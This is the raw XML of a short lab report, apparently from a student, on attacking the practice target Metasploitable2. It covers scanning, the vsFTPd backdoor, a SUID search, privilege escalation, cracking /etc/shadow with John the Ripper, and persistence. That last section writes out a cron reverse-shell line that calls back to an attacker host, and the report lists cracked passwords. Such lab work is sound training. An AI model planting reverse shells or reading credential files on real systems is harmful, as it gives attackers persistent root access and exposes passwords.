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F637A" w14:textId="47FBB9B6" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>System Enumeration, Privilege Escalation &amp; Persistence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE7FFB0" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Tools Used:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E48B789" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nmap, Metasploit, Linux shell utilities, John the Ripper, Cron, Bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B5F03E" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Enumeration of Target System</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCE3C76" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Target: Metasploitable2 (192.168.1.26).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF24EB5" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Scan with Nmap revealed multiple services (FTP, SSH, Telnet, SMTP, HTTP, MySQL, PostgreSQL, VNC, SMB).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C27FC6" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Exploitable Service: vsFTPd 2.3.4 backdoor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AC98E3" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. User Account Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6871FAA7" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Used awk command on /etc/passwd.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A9CFBA" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Discovered accounts: msfadmin, user, services, nobody.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48930476" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. SUID Binary Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1F004D" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Command used: find / -perm -4000 -type f 2&gt;/dev/null.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5B7737" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Identified candidates: /usr/lib/apache2/suexec, /usr/lib/openssh/ssh-keysign.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F972BC" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B39CF1" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Exploited SUID binary misconfiguration to escalate privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1398B321" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>whoami before: msfadmin → after: root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641CA9D7" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Password Cracking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAC876E" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Extracted /etc/shadow file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D45723" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Used John the Ripper with rockyou.txt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781F9AD3" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Recovered weak passwords: batman, 123456789, service.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F838AEF" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Persistence Mechanism</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2475DD73" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cron job reverse shell: @reboot root bash -i &gt;&amp; /dev/tcp/&lt;Kali-IP&gt;/4444 0&gt;&amp;1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BD4A89" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Alternative: Insert reverse shell payload into .bashrc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E147BA" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D89A23C" w14:textId="77777777" w:rsidR="002A53AA" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This project demonstrated enumeration, privilege escalation, password cracking, and persistence techniques on Metasploitable2 using industry-standard tools.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="002A53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2722926">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="361397842">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1744985680">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1992902095">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="766774078">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="617222447">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1990862853">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1393235485">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="119133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3AA"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="0048410A"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00F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ACC7B"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{5BD2A7D7-A930-4367-A5D4-8AC8F87A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KELECHI ANTHONY UKWUOMA</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-25T17:35:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>